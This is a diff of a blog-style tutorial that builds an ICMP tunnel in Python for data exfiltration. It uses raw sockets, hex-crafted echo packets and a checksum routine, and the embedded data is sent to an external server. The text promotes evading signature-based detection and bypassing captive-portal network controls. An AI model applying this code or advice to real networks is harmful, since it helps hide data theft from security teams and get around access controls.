@@ -95,57 +95,105 @@
         <div class="row">
 		<div class="center-block" style="margin-left: 15px;margin-right: 15px;">
 			<p>
-			<b>NOTE: The following information is intended for educational purposes only. I take no responsibility for 
-			anyone's actions.<br><br>I tested this on a Linux (Ubuntu) system using Python 2.7.12, I'd suggest you do 
+			<b>NOTE: I tested this on a Linux (Ubuntu) system using Python 2.7.12, I'd suggest you do 
 			the same. Conversions can be made very easily if you'd like to use another version of Python. If you use a 
 			different OS you may get some errors with the socket creation, however that can be fixed with a quick Google 
 			search (plug in the error number you get and go).</b><br><br>
-			Data exfiltration can be a tricky art. With so many big name data breaches happening every month, many organizations 
-			have invested in DLP (Data Loss Prevention) and SIEM (Security Information and Event Management) systems to prevent 
-			data exfiltration events. Unfortunately, there are still ways to tunnel out of a network and I will be discussing 
-			the basics of one such method today, 
-			<a style="text-decoration:underline" href="https://en.wikipedia.org/wiki/ICMP_tunnel">ICMP Tunneling</a>.<br><br>
-			The basics of ICMP (Internet Control Message Protocol) tunneling revolves around using ICMP echo and reply packets 
-			to create a channel of communication between two systems. What makes this so efffective is that it can be difficult to 
-			block (most organizations can't block ICMP traffic without a lot of hassle) and it can also be difficult to detect 
-			if you're careful.<br><br>
-			For the purposes of this article, our goal is to write a small bit of code to send and recieve a text file using 
-			ICMP tunneling. There are many pre-built solutions you can use such a Loki, or 
+			Ever been in a situation where your outbound network traffic has been blocked? For example at a hotel or coffee shop 
+			wifi access point where they require you to log in to use the internet? These systems can be annoying or intrusive. 
+			What if there was a way to side-step this process and tunnel out of the network? One such way to do this is through 
+			<a style="text-decoration:underline" href="https://en.wikipedia.org/wiki/ICMP_tunnel">ICMP Tunneling</a>.<br><br> 
+			The process of tunneling revolves around using a non-traditional protocol to carry your traffic outside of the network. 
+			There are many different forms of tunneling including DNS and ICMP. Besides being a helpful tool, hackers can use 
+			these techniques to quietly exfiltrate data, without a company's security team noticing. One survey found that as many 
+			as 46% of the sample companies have experienced DNS exfiltration within the last year alone! (<a style="text-decoration:underline" href="http://www.securityweek.com/nearly-50-percent-organizations-hit-dns-attack-last-12-months-survey">source</a>).<br><br>
+			ICMP Data Exfiltration is a nice technique because it makes use of the ICMP (Internet Control Message Protocol) network 
+			protocol, which is typically used for troubleshooting on a network. As a result, not many 
+			organizations can afford the cost of shutting off this important protocol. In addition, not many organizations 
+			recognize how it can be abused, and as a result they do not block outbound ICMP traffic.<br><br>	
+			<b>The goal of this article is to explain the basics of how ICMP tunneling works, develop code to perform 
+			exfiltration, and demonstrate how simple and easy it is. This should only be used in a controlled environment, and 
+			should be run on systems that you own or have permission to use.</b><br><br>
+			It should be noted that there are many pre-built solutions you can use such a Loki, or 
 			<a style="text-decoration:underline" href="https://github.com/DhavalKapil/icmptunnel">icmptunnel</a>. However 
 			i'd like to show how can this can be done from scratch with relatively little effort. In addition, writing your own 
 			code should help prevent being noticed by signature based detection. Alright, let's begin!<br>
+			<h3>ICMP 101: Ping, Request, and Reply</h3>
+			If you have ever made use of ICMP before, it was likely through the "ping" tool on Windows or Linux. Ping allows you 
+			to send some packets to a target (request) and recieve some packets back (reply). Typically when we ping a target, 
+			we will send them some junk data, and they will send that junk back. Instead, what we will do is send crafted data 
+			that we plan to exfiltrate out of the network. I'd encourage you to open a terminal (or Command Prompt) and ping your 
+			localhost.
 			<h3>What does an ICMP packet look like?</h3>
 			The first goal of any project is to know what you're trying to build. In this instance we are trying to impersonate 
-			ICMP requests. The easiest way to know what these look like is to fire up Wireshark and ping your localhost.
+			ICMP requests. The easiest way to know what these packets look like is to set up Wireshark to listen to your 
+			network traffic, and then use the "ping" command to ping your machine (localhost). Below I have a screenshot of 
+			what a ICMP packet looks like.
 			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/1.png" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>
 			There it is! A more astute reader may notice that there is no TCP or UDP header in the packet. This is because ICMP 
 			uses a lower level protocol. As a result, this means that when we build our socket we will have to use something called 
-			a "raw socket". Let's get right to it shall we? First open up your text editor of choice (Vim). And lets type in a 
-			bit of code.<br><br>
+			a "raw socket". The significance of this is that a raw socket, requires root or administrative priviledges to use. 
+			Keep this in mind when running this code. You will have to run this as root (or admin). Notice on the right side of the 
+			bottom panel that we can see some of the junk data that the ping tool naturally generates. Now that we know what the 
+			packet looks like, lets open up our text editor of choice (Vim) and get to work. We will first build a socket with 
+			some parameters with the following code.<br><br>
 			<pre><code>import socket<br>import binascii as b<br><br>try:<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-except socket.error, msg:<br>    print 'Error: ' + str(msg[0]) + 'Dont forget to sudo'<br>    exit()<br><br>packet = b.unhexlify('')<br><br>source = '127.0.0.1'<br>dest = '127.0.0.1'<br><br>print packet<br>sock.sendto(packet,(dest,1010))<br><br>sock.close()</code></pre><br>
+except socket.error, msg:<br>    print 'Error: ' + str(msg[0]) + 'Dont forget to sudo'<br>    exit()<br><br>packet = b.unhexlify('')<br><br>dest = '127.0.0.1'<br><br>print packet<br>sock.sendto(packet,(dest,0))<br><br>sock.close()</code></pre><br>
 			Before continuting, lets take a moment to understand what this code is doing, first we import the socket and binascii 
 			packages (more on this in a moment). Both of these packages should be shipped standard with any installation of Python. 
 			Next we attempt to create a socket object called "sock" for us to interact with. Notice the try catch there? That is 
-			because this program will need to be run with root priviledges. Becuase ICMP packets use a lower level networking system, 
-			they need access to the lower bits of the system (requiring root). That try catch block will trigger if the socket 
-			creation fails (due to priviledges) and will exit the application.<br><br>
+			because this program will need to be run with root priviledges. That try catch block will trigger if the socket 
+			creation fails and will exit the application.<br><br>
 			Next, we are creating the actual packet that we intend to send off. There are many different ways to craft a packet in 
 			Python. Most developers would recommend the 
 			<a style="text-decoration:underline" href="https://docs.python.org/2/library/struct.html">Struct</a> module. However 
 			for the purposes of this article we are going to take a much more quick and dirty approach, literally dumping hex 
-			strings into packet. This is done using a helpful module called 
+			strings into the packet. This is done using a helpful module called 
 			<a style="text-decoration:underline" href="https://docs.python.org/2/library/binascii.html">"binascii"</a>.<br><br>
 			What makes this module so useful is that using the "unhexlify" method, we can convert a hex string to binary and send that 
 			across the network. The reason I like this method (aside from the fact that it's really cute) is that we can literally 
 			copy and paste that hex value we got with Wireshark into our code and run it (The hex string is that middle block 
 			of text in the picture above).<br><br>
-			Let's try this now, simply copy that long hex string you got from Wireshark into the empty packet variable. Then run the 
-			program (be sure to run it as root), and see what you get with Wireshark.
+			After you have pasted the hex string in the line: "packet = b.unhexlify('*PASTE HEX HERE*')", we then specify the 
+			destination of our packet. For this field we are just using our localhost (127.0.0.1) for now. After that, we print 
+			the contents of our packet to the console, and then send it. We send the packet using the "sendto" method from the 
+			socket module. We specify the packet we would like to send, along with a tuple containing the destination IP address, as 
+			well as the port. Due to the nature of how ICMP works, we don't need to specify a specific port, so 0 is fine. Finally 
+			I close the socket at the end of the program.<br><br>
+			Let's try this now. Open up Wireshark and listen to your local traffic. Then, run the code above as root and see what 
+			you get. My output is pictured below.
 			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/2.png" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>
 			Ta-da! We have successfully sent a ICMP request with no effort at all (which is why I prefer the manual hex packet 
 			crafting over Struct in this case). In addition, you can see that our localhost has replied to our request with 
-			an ICMP reply packet.
+			an ICMP reply packet.<br><br>
+			Our next step will be to modify this packet so that we can use it how we want to. There are some things we need to be 
+			aware of. Now, it may be possible for this to work without changing any of the following depending on your setup. I 
+			can't claim to be aware of how every system will react, or how it could be rigged to work this way. All I can say is that 
+			by changing the follow aspects of these packets I was able to communicate with an internet facing server under my control 
+			(more on this in a bit). I would highly encourage you to research and change the following things so that the system will 
+			work. The following is a list of things you will need to modify.<br><br>
+			<ul>
+				<li>Checksum</li>
+				<li>Source Address</li>
+				<li>Destination Address</li>
+			</ul>
+			<h3>Checksum</h3>
+			This is likely the most difficult part of the entire program. I hope you remember bitwise operators and some conversion 
+			tricks. If not, I have some code for you. Suffer where I have not (it wasn't that bad, I just made a technical 
+			miscalculation).<br><br>
+			The most key thing to understand when calculating the checksum is that you are not calculating a checksum for the 
+			entire packet you are sending, just the actual ICMP part of the packet. In my case, this can be found by identifying the 
+			"08" (which identifies an echo ping request) in the hex string. I would recommend using Wireshark to find this as it 
+			is very useful for learning the layout of a packet.<br><br>
+			I'm sure there are packages out there to help you do this (couldn't find any but I only looked for a second), however I 
+			have some code below that does the work and suites our needs because we take in a hex string.<br><br>
+			<pre><code>def checksum(line):<br>    hold = 0<br>    for i in range(0, len(line), 2):<br>        word = ord(line[i]) + (ord(line[i+1]) << 8)<br>        carry = hold + word<br>        hold = (carry & 0xffff) + (carry >> 16)<br>    toReturn = bin(~hold & 0xffff)[2:].zfill(16)<br>    part1 = hex(int(toReturn[:8],2))[2:].zfill(2)<br>    part2 = hex(int(toReturn[8:],2))[2:].zfill(2)<br>    return part2+part1</code></pre><br>
+			As for what part of the hex string we send to the checksum function, lets look at an example. I have provided some 
+			comments to help distinguish some parts of the string.<br><br>
+			<pre><code>packed = b.unhexlify("0800000055d70001" + data)<br>checkSum = checksum(packed)#        This is local IP--V            V--This is server IP<br>packet = b.unhexlify("450000548d9440004001af12" + "0a8773f8" + "8ac54bc5" + "0800" + checkSum + "55d70001" + data)<br>                                   This is where the checksum string starts--^                       ^--packet identifier</code></pre>
+
+			
+			
 		</div>					
         </div>
     </div>
